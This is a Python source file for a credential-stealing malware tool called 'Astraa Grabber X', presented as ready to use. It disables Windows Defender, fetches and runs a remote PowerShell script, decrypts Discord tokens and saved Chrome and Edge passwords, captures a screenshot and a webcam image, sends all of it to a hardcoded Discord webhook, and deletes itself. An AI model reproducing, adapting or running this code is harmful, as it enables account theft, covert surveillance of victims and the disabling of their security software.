from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import os, shutil, sqlite3, json, requests, subprocess, sys
from threading import Thread
from urllib.request import Request, urlopen
from datetime import datetime
from time import sleep
from PIL import ImageGrab
import cv2, socket, platform, getpass
import re

# === Defender & AMSI Bypass - Fuck em all ===
def defender_bypass():
    try:
        subprocess.call('powershell -Command "Add-MpPreference -ExclusionPath \'$env:APPDATA\'"', shell=True)
        subprocess.call('powershell -Command "Add-MpPreference -ExclusionPath \'$env:TEMP\'"', shell=True)
        subprocess.call('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True)
        subprocess.call('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True)
    except: pass

def amsi_bypass():
    try:
        subprocess.call('powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Obfuscation/master/Out-ObfuscatedStringCommand.ps1\'); Out-ObfuscatedStringCommand -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}"', shell=True)
    except: pass

defender_bypass()
amsi_bypass()

WEBHOOK = "https://discord.com/api/webhooks/1466555936410964080/YK37N31GIxyqSb0Ztib43rCMHzAfNS9G0Xey90W0r9BLk-YHfAuINcFCmJDXW7bkGswz"# حط الويبهوك بتاعك هنا يا ملك

def send_to_webhook(content=None, files=None):
    try:
        if files:
            requests.post(WEBHOOK, files=files)
        else:
            requests.post(WEBHOOK, json={"content": content, "username": "Astraa Grabber X", "avatar_url": "https://i.imgur.com/atio.jpg"})
    except: pass

def getip():
    try: return requests.get("https://api.ipify.org").text
    except: return "Unknown"

def grab_tokens():
    tokens = []
    paths = {
        'Discord': os.getenv("APPDATA") + '\\discord',
        'Discord Canary': os.getenv("APPDATA") + '\\discordcanary',
        'Discord PTB': os.getenv("APPDATA") + '\\discordptb',
        'Opera': os.getenv("APPDATA") + '\\Opera Software\\Opera Stable',
        'Opera GX': os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable',
        'Chrome': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default',
        'Edge': os.getenv("LOCALAPPDATA") + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': os.getenv("LOCALAPPDATA") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    }

    for name, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
                encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        except: continue

        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path): continue

        for file in os.listdir(leveldb_path):
            if not file.endswith((".log", ".ldb")): continue
            try:
                with open(os.path.join(leveldb_path, file), "r", errors="ignore") as f:
                    for line in f:
                        for token in re.findall(r"dQw4w9WgXcQ:([^\"']+)", line):
                            try:
                                token_data = b64decode(token)
                                iv = token_data[3:15]
                                payload = token_data[15:]
                                cipher = AES.new(CryptUnprotectData(encrypted_key, None, None, None, 0)[1], AES.MODE_GCM, iv)
                                decrypted = cipher.decrypt(payload)[:-16].decode()
                                if decrypted not in tokens:
                                    tokens.append(decrypted)
                                    headers = {"Authorization": decrypted}
                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                                    if r.status_code == 200:
                                        user = r.json()
                                        info = f"**{name} Token Grabbed 🔥**\nUser: {user['username']}#{user['discriminator']}\nID: {user['id']}\nEmail: {user.get('email','None')}\nPhone: {user.get('phone','None')}\nToken: ```{decrypted}```\nIP: {getip()}\nPC: {getpass.getuser()}@{socket.gethostname()}"
                                        send_to_webhook(info)
                            except: pass
            except: pass

def grab_passwords():
    browsers = [
        (os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default", "Chrome"),
        (os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default", "Edge"),
    ]
    for browser_path, name in browsers:
        login_db = os.path.join(browser_path, "Login Data")
        if not os.path.exists(login_db): continue
        try:
            temp_db = "temp_login.db"
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            with open(os.path.join(browser_path, "..", "Local State"), "r", encoding="utf-8") as f:
                key = b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
            
            data = f"**{name} Passwords Grabbed 😈**\n"
            for row in cursor.fetchall():
                url, username, encrypted_pass = row
                if not encrypted_pass: continue
                try:
                    iv = encrypted_pass[3:15]
                    payload = encrypted_pass[15:-16]
                    cipher = AES.new(CryptUnprotectData(key, None, None, None, 0)[1], AES.MODE_GCM, iv)
                    password = cipher.decrypt(payload).decode()
                    data += f"URL: {url}\nUser: {username}\nPass: {password}\n{'-'*60}\n"
                except: pass
            send_to_webhook(data[:1900])
            conn.close()
            os.remove(temp_db)
        except: pass

def screenshot():
    try:
        img = ImageGrab.grab()
        img.save("scr.jpg")
        send_to_webhook(files={'file': open("scr.jpg", "rb")})
        os.remove("scr.jpg")
    except: pass

def webcam_snap():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("cam.jpg", frame)
            send_to_webhook(files={'file': open("cam.jpg", "rb")})
            os.remove("cam.jpg")
        cap.release()
    except: pass

if __name__ == "__main__":
    Thread(target=grab_tokens).start()
    Thread(target=grab_passwords).start()
    Thread(target=screenshot).start()
    Thread(target=webcam_snap).start()
    sleep(12)
    try:
        os.remove(sys.argv[0])  # self delete - clean boy 😏
    except: pass
    sys.exit()
